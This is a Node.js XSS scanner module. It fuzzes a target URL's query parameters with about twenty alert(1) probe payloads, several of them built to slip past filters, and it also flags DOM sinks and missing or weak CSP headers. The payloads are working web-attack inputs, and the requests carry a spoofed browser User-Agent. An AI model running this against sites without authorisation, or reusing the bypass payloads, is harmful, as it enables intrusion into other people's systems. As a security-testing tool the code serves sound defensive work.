const axios = require('axios');

// ═══════════════════════════════════════════════════════════════
// XSS Scanner — Representative payloads, parallel execution
// ═══════════════════════════════════════════════════════════════

// Trimmed to the most representative / high-value payloads (was 80+)
const PAYLOADS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "<img src=x onerror=alert(1)>",
  '<svg onload=alert(1)>',
  '" onmouseover="alert(1)',
  "'><svg/onload=alert(1)>",
  '</title><script>alert(1)</script>',
  '<body onload=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert(1)}',
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src=x onerror=window["al"+"ert"](1)>',
  '"><img src=x onerror=alert(1)//><svg/onload=alert(1)//>',
  '<details open ontoggle=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<script>eval(atob("YWxlcnQoMSk="))</script>',
];

// DOM sinks to analyze
const DOM_SINKS = [
  'document.write', 'innerHTML', 'outerHTML', 'insertAdjacentHTML',
  'eval(', 'setTimeout(', 'setInterval(', 'Function(',
  'window.location', 'location.href', 'location.assign', 'location.replace',
  'document.cookie', 'window.name', 'localStorage', 'sessionStorage',
  'jQuery.html(', '$.html(', 'v-html', 'dangerouslySetInnerHTML',
  'bypassSecurityTrust', 'trustAsHtml',
];

// URL params to fuzz (top 5 only)
const PARAMS = ['q', 'search', 'id', 'name', 'url'];

const REQ_TIMEOUT = 6000;   // 6s per request
const BATCH_SIZE  = 8;      // parallel payloads per batch
const SCANNER_TIMEOUT = 60000; // 60s hard cap for whole scanner

async function scan(targetUrl) {
  const results = { tests: [], findings: [] };

  const deadline = Date.now() + SCANNER_TIMEOUT;

  const safeGet = (url) =>
    axios.get(url, {
      timeout: REQ_TIMEOUT,
      validateStatus: () => true,
      maxRedirects: 2,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
    }).catch(() => null);

  try {
    // 1. Check reflected payloads — parallel batches
    for (let i = 0; i < PAYLOADS.length; i += BATCH_SIZE) {
      if (Date.now() > deadline) break;  // hard timeout guard

      const batch = PAYLOADS.slice(i, i + BATCH_SIZE);
      const batchResults = await Promise.all(batch.map(async (payload) => {
        for (const param of PARAMS) {
          if (Date.now() > deadline) break;
          const r = await safeGet(`${targetUrl}?${param}=${encodeURIComponent(payload)}`);
          if (!r) continue;
          const body = typeof r.data === 'string' ? r.data : '';
          if (body.includes(payload) || body.includes(payload.replace(/"/g, '&quot;'))) {
            return { param, payload, reflected: true };
          }
        }
        return { payload, reflected: false };
      }));

      for (const res of batchResults) {
        if (res.reflected) {
          results.tests.push({ id: `xss-${res.param}-reflect`, name: `XSS payload reflected in ?${res.param}`, status: 'fail', severity: 'critical' });
          results.findings.push({ param: res.param, payload: res.payload.substring(0, 60), type: 'reflected' });
        } else {
          results.tests.push({ id: `xss-payload-${results.tests.length}`, name: `XSS payload: ${res.payload.substring(0, 50)}`, status: 'pass', severity: 'info' });
        }
      }
    }

    // 2. DOM sink analysis
    const r = await safeGet(targetUrl);
    if (r) {
      const body = typeof r.data === 'string' ? r.data : '';
      for (const sink of DOM_SINKS) {
        const found = body.includes(sink);
        results.tests.push({
          id: `xss-sink-${sink.replace(/[^a-z]/gi, '')}`,
          name: `DOM XSS sink — ${sink}`,
          status: found ? 'warn' : 'pass',
          severity: found ? 'medium' : 'info'
        });
        if (found) results.findings.push({ sink, type: 'dom_sink' });
      }

      // 3. CSP header check
      const csp = r.headers['content-security-policy'] || '';
      if (!csp) {
        results.tests.push({ id: 'xss-no-csp', name: 'No Content-Security-Policy (XSS risk)', status: 'fail', severity: 'high' });
      } else {
        results.tests.push({ id: 'xss-csp-present', name: 'Content-Security-Policy present', status: 'pass', severity: 'info' });
        if (csp.includes("'unsafe-inline'"))
          results.tests.push({ id: 'xss-csp-inline', name: "CSP allows 'unsafe-inline' (XSS risk)", status: 'fail', severity: 'high' });
        if (csp.includes("'unsafe-eval'"))
          results.tests.push({ id: 'xss-csp-eval', name: "CSP allows 'unsafe-eval' (XSS risk)", status: 'fail', severity: 'high' });
      }

      // 4. X-XSS-Protection header
      const xxss = r.headers['x-xss-protection'] || '';
      results.tests.push({ id: 'xss-xxp', name: xxss ? `X-XSS-Protection: ${xxss}` : 'X-XSS-Protection header missing', status: xxss ? 'pass' : 'warn', severity: xxss ? 'info' : 'low' });
    }

  } catch (err) {
    results.error = err.message;
  }

  return { scanner: 'XSS Testing', icon: '💉', results, testCount: results.tests.length };
}

module.exports = { scan };
